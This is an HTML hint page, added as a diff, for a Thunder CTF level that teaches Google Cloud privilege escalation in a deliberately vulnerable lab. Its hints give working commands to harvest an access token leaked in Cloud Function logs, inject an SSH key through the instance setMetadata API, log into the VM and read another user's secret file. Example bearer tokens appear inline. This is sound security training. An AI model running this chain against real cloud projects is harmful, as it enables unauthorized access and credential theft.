@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Thunder CTF</title>
+  <link rel="stylesheet" type="text/css" href="../static/style.css">
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Nova+Square' rel='stylesheet' type='text/css'>
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300' rel='stylesheet' type='text/css'>
+  </link>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  </meta>
+</head>
+
+<body>
+  <header class="banner" style="top: 5px">
+    <div id="nav">
+      <h1 style="margin-top:0px;">Thunder CTF</h1>
+    </div>
+  </header>
+  <div class="level">
+    <div style="padding-bottom:10px">
+      <a class="levelbanner levelbutton" href="../..">&#8592</a>
+      <h2 class="levelbanner">a4replicate</h2>
+    </div>
+    <h3 style="text-align: left; padding-left:5px;">Setup:</h3>
+    <pre>python3 thunder.py create a4replicate</pre>
+      <p>Activate the service account given to you. You MUST do this, as using your google user account to complete the level would be considered cheating.</p>
+      <pre>gcloud auth activate-service-account --key-file=start/a4-access.json</pre>
+    <h3 style="text-align: left; padding-left:5px;">Destroy:</h3>
+    <pre>python3 thunder.py destroy a4replicate</pre>
+  </div>
+  <br>
+  <div class=hints>
+    <div>
+      <span id="prev" class="hintbanner hintbutton buttondisabled">Prev</span>
+      <span id="hinttitle" class="hintbanner hintbannertext">test</span>
+      <span id="next" class="hintbanner hintbutton">Next</span>
+    </div>
+    <div id="hintdisplay" class="hintdisplay">
+      <pre>testpre</pre>
+    </div>
+  </div>
+  <footer class="bottombanner">PSU CTF: Work done under NSF Award #1821841</footer>
+
+
+
+  <ul id="hint_content" style="display: none">
+    <li>
+      <span>Intro</span>
+      <p>In this level, the secret is hidden somewhere in the cloud infrastructure. Use the given compromised credentials to find it</p>
+    </li>
+    
+    <li>
+      <span>Hint 1</span>
+      <p>Test the permissions of the given credentials using the test-permissions.py script.</p>
+    </li>
+    
+    <li>
+      <span>Hint 2</span>
+      <p>The credentials have the permission cloudfunctions.functions.list</p>
+    </li>
+    
+    <li>
+      <span>Hint 3</span>
+      <p>List the cloud functions in the project:</p>
+      <pre>gcloud functions list</pre>
+    </li>
+    
+    <li>
+      <span>Hint 4</span>
+      <p>Try calling the function using the service account's access token:</p>
+      <pre>curl https://[location]-[project-id].cloudfunctions.net/[function-name] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
+    </li>
+    
+    <li>
+      <span>Hint 5</span>
+      <p>Try reading one of the files by adding "?file=[filename] to the end of the url</p>
+    </li>
+    
+    <li>
+      <span>Hint 6</span>
+      <p>See what happens if you try to read a file that doesn't exist.</p>
+    </li>
+    
+    <li>
+      <span>Hint 7</span>
+      <p>The cloud function throws an error when a non-existent file is queried. Cloud function runtime errors are logged in StackDriver logging.</p>
+    </li>
+    
+    <li>
+      <span>Hint 8</span>
+      <p>Read the cloud function related logs:</p>
+      <pre>gcloud functions logs read</pre>
+    </li>
+    
+    <li>
+      <span>Hint 9</span>
+      <p>The function logged the HTTP request that it attempted to make. See if there's anything useful in the request.</p>
+    </li>
+    
+    <li>
+      <span>Hint 10</span>
+      <p>An access token was included in the logged HTTP request in the "Authorization" header. The token can be used to access any API functions that the function's attached service account had permission for.</p>
+      <p>Example:</p>
+      <pre>GET https://www.googleapis.com/storage/v1/b/a4-bucket-884260860342/o/file3.txt?alt=media
+
+Authorization: Bearer ya29.c.EqEBZwepkOFych006VjfVDFAJxSb5ErvGmBsVqq8S83NiJXZ_jaQsZlW0lWTP0q6Hs44ICf6mUkDYhOBG5H15A-lsIB-X9bMA-cJ9cl0mt-TU0q7vZjb0qdSUbYasDSTMBXKNzgkX_S_8ipAWVfg4HXfs_pb1Iid7O_QSxl1FeueTEQ6ns96Z1uRiF2qYQJlTyrWRKO3mPPGE1R9C0Nf9en2iFM</pre>
+    </li>
+    
+    <li>
+      <span>Hint 11</span>
+      <p>Check the permissions of the access token using the test-permissions.py script by setting USE_ACCESS_TOKEN to True and ACCESS_TOKEN to the access token</p>
+      <p>Example:</p>
+      <pre># If set to true, credentials will be created using ACCESS_TOKEN instead of SERVICE_ACCOUNT_KEY_FILE
+USE_ACCESS_TOKEN = True
+# Only one of the following need to be set:
+SERVICE_ACCOUNT_KEY_FILE = ''
+ACCESS_TOKEN = 'ya29.c.EqEBZwepkOFych006VjfVDFAJxSb5ErvGmBsVqq8S83NiJXZ_jaQsZlW0lWTP0q6Hs44ICf6mUkDYhOBG5H15A-lsIB-X9bMA-cJ9cl0mt-TU0q7vZjb0qdSUbYasDSTMBXKNzgkX_S_8ipAWVfg4HXfs_pb1Iid7O_QSxl1FeueTEQ6ns96Z1uRiF2qYQJlTyrWRKO3mPPGE1R9C0Nf9en2iFM'
+# Set the project ID
+PROJECT_ID = '[project-id]'</pre>
+    </li>
+    
+    <li>
+      <span>Hint 12</span>
+      <p>The token has the compute.instances.setMetadata ability, which can be used to add allowed ssh keys to the metadata of instances.</p>
+    </li>
+    
+    <li>
+      <span>Hint 13</span>
+      <p>If you list the instances on the project using the start credentials, you will see there is an instance running. Try to gain access to it.</p>
+      <pre>gcloud compute instances list</pre>
+      <pre>gcloud compute instances describe [instance-name]</pre>
+    </li>
+    
+    <li>
+      <span>Hint 14</span>
+      <p>Use the <a class="inline" href="https://cloud.google.com/compute/docs/reference/rest/v1/instances/setMetadata">instances.setMetadata</a> function of the Compute Engine REST API to set up an ssh key for you to use to login to the instance.</p>
+    </li>
+    
+    <li>
+      <span>Hint 15</span>
+      <p>To generate an SSH key to connect to the instance we are creating, run the following:</p>
+      <pre>ssh-keygen -f ./a4_key -t rsa -b 2048</pre>
+      <pre>chmod 400 a4_key</pre>
+      <p>The public key is stored in a4_key.pub</p>
+      <p>The "fingerprint" that is needed to make the request can be found under "metadata" when running:</p>
+      <pre>gcloud compute instances describe [instance-name]</pre>
+      <p>Make a request calling instances.setMetadata to add your SSH key to the instance with the username "ubuntu" using the cloud function's access token</p>
+      <textarea>curl --request POST \
+  'https://www.googleapis.com/compute/v1/projects/[PROJECT]/zones/[ZONE]/instances/[INSTANCE-NAME]/setMetadata' \
+  -H 'Authorization: Bearer [ACCCESS-TOKEN]' \
+  -H 'Accept: application/json' \
+  -H 'Content-Type: application/json' \
+  --data '{
+    "fingerprint": "[INSTANCE-METADATA-FINGERPRINT]",
+    "items": [
+      {
+        "key": "ssh-keys",
+        "value": "ubuntu:ssh-rsa [SSH-PUBLIC-KEY] ubuntu"
+      }
+    ]
+  }'</textarea>
+      <p>Example:</p>
+      <pre>curl --request POST \
+  'https://www.googleapis.com/compute/v1/projects/gcp-vulnerable/zones/us-west1-b/instances/a4-instance/setMetadata' \
+  -H 'Authorization: Bearer ya29.c.EqEBaQcnTsriJ_17rOa4mN05JHhC9hfXMp-T10gmdHWkC-xXB-Gfc27tFqgGYr4pGC8-8OeHe6acRjd3AHGBeZOWSEGUrKe9blwZK2bxiKXDoQJoiv7EbAxhdXC_wpfQtA12kmxjDArI0iT8GDJDf5qgYRLlIoJBnFRC2viaenbpsNfqw2ibu98wGp8OEhINDXn2m3Vnx-2tfoP6SHP8ysVBv7Q' \
+  -H 'Accept: application/json' \
+  -H 'Content-Type: application/json' \
+  --data '{
+    "fingerprint": "9Qs5OzliW7s=",
+    "items": [
+      {
+        "key": "ssh-keys",
+        "value": "ubuntu:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKM2TM8CB7xUGD3/VxDCGOzCW1PCvaINfDChnYb0rJ4WWEuB7dFWc5R4NfycMDRCBGLWVlUWRqP0M4MSQB14SkuxuFtgkBL18mHipLR7LvXOL7YOrurfoi8RgNU0TFEogbTUGkM7XNc1EVma4kJ7vs8sBLukiZT0gwBms1Zi0s3Xen8lwTEDPvD6XJtoA+RT0zsVCDPalWv4SqfOxuKaY1SOqhqa4DQaEvDmIGZzZpbKcS82hEQGreNMAodWDind2nTdOMbS1gbHjxcZVZkWKssi9R2r2eFpSrrmaa98uo+5/sK0eoqqJNS1Ua7L8W1Dj1Mp0ucYW53yzexk8uCl+H ubuntu"
+      }
+    ]
+  }'</pre>
+      <p>SSH into the instance:</p>
+      <pre>ssh -i a4_key ubuntu@[EXTERNAL-IP]</pre>
+    </li>
+    
+    <li>
+      <span>Hint 16</span>
+      <p>Check the directories of the other users</p>
+      <pre>cd ..
+ls</pre>
+    </li>
+    
+    <li>
+      <span>Hint 17</span>
+      <p>The secret is stored in the home file of the user "secretuser"</p>
+      <pre>cd ~/../secretuser
+cat secret.txt</pre>
+    </li>
+    
+  </ul>
+
+  <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+  <script src="../static/slideshow.js"></script>
+  <script src="../static/bannercollapse.js"></script>
+</body>
+
+</html>
